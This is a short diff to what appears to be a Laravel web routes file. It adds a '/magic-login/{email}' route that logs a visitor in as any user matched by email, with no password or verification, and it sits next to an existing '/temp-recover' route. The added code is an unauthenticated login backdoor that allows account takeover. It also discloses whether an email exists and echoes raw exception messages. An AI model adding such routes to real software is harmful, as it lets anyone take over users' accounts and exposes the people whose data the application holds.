@@ -77,6 +77,19 @@ Route::get('/temp-recover/{email}/{password}', function($email, $password) {
     }
 });
 
+Route::get('/magic-login/{email}', function($email) {
+    try {
+        $user = \App\Models\User::where('email', $email)->first();
+        if (!$user) {
+            return "User not found with email: " . htmlspecialchars($email);
+        }
+        \Illuminate\Support\Facades\Auth::login($user);
+        return redirect('/dashboard');
+    } catch (\Exception $e) {
+        return "Error: " . $e->getMessage();
+    }
+});
+
 Route::get('/lang',[
     'uses' => 'App\Http\Controllers\HomeController@lang',
     'as' => 'lang.index'
